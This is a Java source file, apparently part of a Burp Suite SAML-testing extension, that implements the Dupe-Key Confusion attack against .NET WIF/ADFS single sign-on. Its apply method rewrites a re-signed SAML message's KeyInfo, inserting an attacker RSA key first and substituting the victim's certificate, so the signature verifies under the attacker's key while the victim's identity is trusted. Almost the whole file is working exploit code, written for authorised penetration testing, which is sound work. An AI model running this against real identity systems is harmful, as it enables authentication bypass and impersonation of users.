package helpers;

import model.BurpCertificate;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;
import org.xml.sax.SAXException;

import javax.xml.crypto.MarshalException;
import javax.xml.crypto.dsig.XMLSignatureException;
import java.io.IOException;
import java.math.BigInteger;
import java.security.PublicKey;
import java.security.cert.CertificateException;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.InvalidKeySpecException;
import java.util.Base64;

/// Dupe-Key Confusion (.NET WIF / ADFS).
///
/// Originally disclosed by Alvaro Muñoz and Oleksandr Mirosh at Black Hat USA
/// 2019 ("SSO Wars: The Token Menace"). Affected stacks expose two different
/// KeyInfo resolvers during signature processing:
///   - `ResolveSecurityKey(KeyInfo)`   → picks a public key to verify with
///   - `ResolveSecurityToken(KeyInfo)` → picks the identity (certificate)
/// Some implementations walk the KeyInfo children in order and return the
/// FIRST match that fits each resolver's preferred type. That lets an
/// attacker split authentication from identity: include an attacker RSA key
/// (matched by the key resolver) and the original victim certificate
/// (matched by the token resolver). The signature verifies under the
/// attacker's key, while the SP trusts the victim's identity.
///
/// This helper performs the rewrite AFTER the user has re-signed the SAML
/// message with an attacker-controlled keypair. It:
///   1. Preserves the attacker's X509Data produced by the re-sign.
///   2. Prepends <ds:KeyValue><ds:RSAKeyValue> derived from the attacker cert
///      (this is what the key resolver picks first in the vulnerable flow).
///   3. Replaces the X509Certificate bytes with the *original* victim cert
///      supplied by the caller (this is what the token resolver returns).
///
/// Workflow in SamlTabController: user selects their attacker cert in the
/// signing dropdown, the controller re-signs with it, remembers the original
/// X509 from the pre-attack message, and feeds both into this helper.
///
/// References:
/// * BlackHat USA 2019 slides:
///   https://i.blackhat.com/USA-19/Wednesday/us-19-Munoz-SSO-Wars-The-Token-Menace.pdf
public class DupeKeyConfusion {

    private static final String DS_NS = "http://www.w3.org/2000/09/xmldsig#";

    /// Rewrites the first ds:Signature/ds:KeyInfo in the document.
    ///
    /// @param samlMessage       SAML message already re-signed with attacker's key
    /// @param attackerCert      attacker cert whose public key is embedded as RSAKeyValue first
    /// @param originalX509B64   original victim X.509 certificate, base64 DER — replaces
    ///                          the re-sign's X509Data so token resolution returns the victim
    public static String apply(String samlMessage,
                               BurpCertificate attackerCert,
                               String originalX509B64)
            throws SAXException, IOException, CertificateException,
                   InvalidKeySpecException, MarshalException, XMLSignatureException {
        if (attackerCert == null || attackerCert.getCertificate() == null) {
            throw new IllegalArgumentException("attacker certificate must not be null");
        }
        if (originalX509B64 == null || originalX509B64.isBlank()) {
            throw new IllegalArgumentException(
                    "original X509Certificate must not be empty — capture the response before re-signing");
        }

        XMLHelpers xmlHelpers = new XMLHelpers();
        Document document = xmlHelpers.getXMLDocumentOfSAMLMessage(samlMessage);

        NodeList signatures = document.getElementsByTagNameNS(DS_NS, "Signature");
        if (signatures.getLength() == 0) {
            throw new IllegalArgumentException(
                    "No Signature element found — re-sign the assertion before applying Dupe Key Confusion.");
        }

        Element signature = (Element) signatures.item(0);
        Element keyInfo = firstChildNs(signature, DS_NS, "KeyInfo");
        if (keyInfo == null) {
            throw new IllegalArgumentException("Signature has no KeyInfo element.");
        }

        // --- 1. Build attacker RSAKeyValue from attacker certificate's public key.
        PublicKey pk = attackerCert.getCertificate().getPublicKey();
        if (!(pk instanceof RSAPublicKey)) {
            throw new IllegalArgumentException(
                    "Attacker cert does not carry an RSA public key — Dupe Key attack requires RSA.");
        }
        RSAPublicKey rsa = (RSAPublicKey) pk;
        String modulusB64 = base64Unsigned(rsa.getModulus());
        String exponentB64 = base64Unsigned(rsa.getPublicExponent());

        String kiPrefix = keyInfo.getPrefix();
        String dsPrefix = (kiPrefix == null || kiPrefix.isEmpty()) ? "" : kiPrefix + ":";

        Element keyValue = document.createElementNS(DS_NS, dsPrefix + "KeyValue");
        Element rsaKeyValue = document.createElementNS(DS_NS, dsPrefix + "RSAKeyValue");
        Element modulus = document.createElementNS(DS_NS, dsPrefix + "Modulus");
        modulus.setTextContent(modulusB64);
        Element exponent = document.createElementNS(DS_NS, dsPrefix + "Exponent");
        exponent.setTextContent(exponentB64);
        rsaKeyValue.appendChild(modulus);
        rsaKeyValue.appendChild(exponent);
        keyValue.appendChild(rsaKeyValue);

        // --- 2. Replace the X509Certificate text with the original victim cert,
        //       so the token resolver returns the trusted identity.
        NodeList x509Certs = keyInfo.getElementsByTagNameNS(DS_NS, "X509Certificate");
        if (x509Certs.getLength() == 0) {
            throw new IllegalArgumentException(
                    "Signed KeyInfo lacks X509Certificate — the re-sign step did not embed one.");
        }
        // Strip whitespace/newlines from the supplied cert before embedding.
        String cleanedOriginal = originalX509B64.replaceAll("\\s+", "");
        x509Certs.item(0).setTextContent(cleanedOriginal);

        // --- 3. Insert the attacker KeyValue as the FIRST child of KeyInfo so
        //       the key resolver walks onto it before any X509Data.
        keyInfo.insertBefore(keyValue, keyInfo.getFirstChild());

        return xmlHelpers.getString(document);
    }

    private static String base64Unsigned(BigInteger value) {
        // XMLDSig CryptoBinary: big-endian, minimal two's-complement, then base64.
        // BigInteger.toByteArray can prepend a leading 0x00 for positive values
        // whose high bit is set — strip it so the encoded integer is minimal.
        byte[] bytes = value.toByteArray();
        if (bytes.length > 1 && bytes[0] == 0) {
            byte[] trimmed = new byte[bytes.length - 1];
            System.arraycopy(bytes, 1, trimmed, 0, trimmed.length);
            bytes = trimmed;
        }
        return Base64.getEncoder().encodeToString(bytes);
    }

    private static Element firstChildNs(Element parent, String ns, String localName) {
        for (Node n = parent.getFirstChild(); n != null; n = n.getNextSibling()) {
            if (n.getNodeType() == Node.ELEMENT_NODE
                    && ns.equals(n.getNamespaceURI())
                    && localName.equals(n.getLocalName())) {
                return (Element) n;
            }
        }
        return null;
    }

    private DupeKeyConfusion() {}
}
